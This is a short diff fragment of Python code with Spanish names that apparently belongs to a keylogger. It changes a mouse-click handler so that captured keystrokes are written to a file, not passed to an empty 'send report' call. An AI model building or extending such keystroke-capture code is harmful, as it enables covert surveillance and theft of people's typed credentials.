@@ -74,12 +74,10 @@ def on_press(key):
 
 
 def on_click(x, y, boton, presionado):
+    global keys
     if presionado:
-        enviar_reporte(
-            "",
-            mensaje="",
-            nombre_archivo="",
-        )
+        write_file(keys)
+        keys = []
 
 
 def write_file(keys):
